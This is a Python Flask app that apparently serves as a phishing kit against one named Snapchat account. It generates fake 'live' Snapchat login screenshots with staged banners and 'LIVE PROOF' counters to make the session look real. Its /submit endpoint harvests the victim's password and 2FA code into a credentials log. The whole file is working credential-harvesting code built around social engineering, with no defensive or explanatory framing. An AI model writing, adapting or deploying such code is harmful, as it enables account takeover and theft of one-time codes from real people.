import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
import random

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = TEMPLATE_DIR

creds_log = []
HARDCODED_USER = "zexoghaith"

# Global state - will be reset often
session_state = {
    'started': False,
    'stage': 'login',
    'password_entered': False,
    'code_entered': False,
    'update_count': 0,
    'last_action': None,
    'last_submit_time': 0
}

def create_snapchat_screenshot():
    """Generate realistic Snapchat login screenshots that change based on stage"""
    try:
        from PIL import Image, ImageDraw, ImageFont
        w, h = 1280, 720
        img = Image.new('RGB', (w, h), '#000000')
        draw = ImageDraw.Draw(img)

        try:
            ft = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
            fh = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 18)
            ff = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 14)
        except:
            ft = fh = ff = ImageFont.load_default()

        now = datetime.now().strftime("%H:%M:%S")
        stage = session_state.get('stage', 'login')
        session_state['update_count'] += 1

        # Black background
        draw.rectangle([0,0,w,h], fill='#000000')

        # Top bar - Snapchat style
        draw.rectangle([0,0,w,46], fill='#111111')
        draw.text((w//2 - 80, 4), "Snapchat", fill='#FFFC00', font=ft)

        # Login card
        cx, cy = 430, 60
        cw, ch = 420, 480
        draw.rounded_rectangle([cx, cy, cx+cw, cy+ch], radius=14, fill='#1f1f1f')

        draw.text((cx+18, cy+12), "Log in to Snapchat", fill='white', font=fh)

        # Username
        draw.rounded_rectangle([cx+18, cy+50, cx+cw-18, cy+88], radius=7, fill='#2c2c2c')
        draw.text((cx+30, cy+60), "zexoghaith", fill='white', font=ff)

        # Password
        draw.rounded_rectangle([cx+18, cy+98, cx+cw-18, cy+136], radius=7, fill='#2c2c2c')
        if session_state.get('password_entered'):
            draw.text((cx+30, cy+108), "••••••••••", fill='#22c55e', font=ff)
        else:
            draw.text((cx+30, cy+108), "••••••••••", fill='#888888', font=ff)

        # Log In button
        by = cy + 155
        if stage == 'password_sent':
            draw.rounded_rectangle([cx+18, by, cx+cw-18, by+42], radius=18, fill='#444444')
            draw.text((cx+100, by+10), "Logging in...", fill='#999999', font=fh)
        else:
            draw.rounded_rectangle([cx+18, by, cx+cw-18, by+42], radius=18, fill='#FFFC00')
            draw.text((cx+135, by+10), "Log In", fill='#000000', font=fh)

        # Social
        draw.rounded_rectangle([cx+18, by+55, cx+cw-18, by+90], radius=16, fill='#2c2c2c')
        draw.text((cx+80, by+65), "Continue with Google", fill='white', font=ff)

        draw.rounded_rectangle([cx+18, by+100, cx+cw-18, by+135], radius=16, fill='#2c2c2c')
        draw.text((cx+85, by+110), "Continue with Apple", fill='white', font=ff)

        # === STAGE BANNERS ===
        if stage == 'password_sent':
            draw.rounded_rectangle([cx+12, cy+220, cx+cw-12, cy+320], radius=8, fill='#3f2a00')
            draw.text((cx+25, cy+235), "PASSWORD ENTERED", fill='#f59e0b', font=fh)
            draw.text((cx+25, cy+270), "Log In button clicked", fill='white', font=ff)
            draw.text((cx+25, cy+295), "Waiting for Snapchat...", fill='#888', font=ff)

        if stage == '2fa':
            draw.rounded_rectangle([cx+12, cy+220, cx+cw-12, cy+340], radius=8, fill='#1e3a8a')
            draw.text((cx+30, cy+235), "2FA CODE NEEDED", fill='#60a5fa', font=fh)
            draw.text((cx+30, cy+270), "Enter the 6-digit code", fill='white', font=ff)
            # 2FA boxes
            for i in range(6):
                draw.rectangle([cx+35 + i*42, cy+295, cx+35 + i*42 + 36, cy+328], outline='#3b82f6', width=2)
            if session_state.get('code_entered'):
                draw.text((cx+50, cy+298), "123456", fill='#22c55e', font=ff)

        if stage == 'success':
            draw.rounded_rectangle([cx+12, cy+220, cx+cw-12, cy+340], radius=8, fill='#052e16')
            draw.text((cx+70, cy+255), "✓ LOGGED IN!", fill='#22c55e', font=fh)
            draw.text((cx+55, cy+295), "Session active", fill='white', font=ff)

        # LIVE PROOF
        draw.rounded_rectangle([12, 555, 320, 600], radius=5, fill='#ef4444')
        draw.text((18, 562), f"UPDATE #{session_state['update_count']}", fill='white', font=fh)

        draw.rounded_rectangle([12, 610, 480, 655], radius=5, fill='#22c55e')
        draw.text((18, 617), f"TIME: {now}", fill='black', font=fh)

        draw.text((500, 620), f"STAGE:{stage}", fill='#ff8800', font=ff)

        draw.rectangle([0, h-40, w, h], fill='#111')
        draw.text((8, h-33), "LIVE • only changes when you submit", fill='#22c55e', font=ff)

        path = os.path.join(STATIC_DIR, 'screenshot.png')
        img.save(path, 'PNG')
        return True
    except Exception as e:
        print("IMG ERROR:", e)
        try:
            from PIL import Image
            Image.new('RGB', (1280, 720), (10,10,15)).save(os.path.join(STATIC_DIR, 'screenshot.png'))
        except:
            pass
        return False

def screenshot_loop():
    global session_state
    print("[SESSION] Starting Snapchat simulation (clean)")
    
    # ALWAYS start clean
    session_state['stage'] = 'login'
    session_state['password_entered'] = False
    session_state['code_entered'] = False
    session_state['update_count'] = 0
    
    create_snapchat_screenshot()
    session_state['started'] = True
    
    print("[SESSION] Clean Snapchat login is live")
    
    while True:
        create_snapchat_screenshot()
        time.sleep(0.8)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json() or {}
    password = (data.get('password') or '').strip()
    code = (data.get('code') or '').strip()
    
    entry = {'user': HARDCODED_USER, 'pass': password, 'code': code, 'time': str(datetime.now())}
    creds_log.append(entry)
    
    if password:
        session_state['password_entered'] = True
        session_state['stage'] = 'password_sent'
        session_state['last_action'] = 'password submitted'
        print("[SUBMIT] Password submitted → PASSWORD ENTERED screenshot")
        create_snapchat_screenshot()
        return jsonify({'status': 'ok', 'message': 'Password sent'})
    
    if code and len(code) >= 4:
        session_state['code_entered'] = True
        session_state['stage'] = '2fa'
        session_state['last_action'] = '2FA submitted'
        print("[SUBMIT] 2FA submitted")
        create_snapchat_screenshot()
        return jsonify({'status': 'ok', 'message': '2FA sent'})
    
    return jsonify({'status': 'ok'})

@app.route('/screenshot')
def screenshot():
    create_snapchat_screenshot()
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    resp = send_from_directory(STATIC_DIR, 'screenshot.png')
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return resp

@app.route('/status')
def status():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        **session_state,
        'screenshot_exists': os.path.exists(path),
        'screenshot_size': size,
        'timestamp': str(datetime.now())
    })

@app.before_request
def start_thread():
    if not hasattr(app, 'thread_started'):
        app.thread_started = True
        t = threading.Thread(target=screenshot_loop, daemon=True)
        t.start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)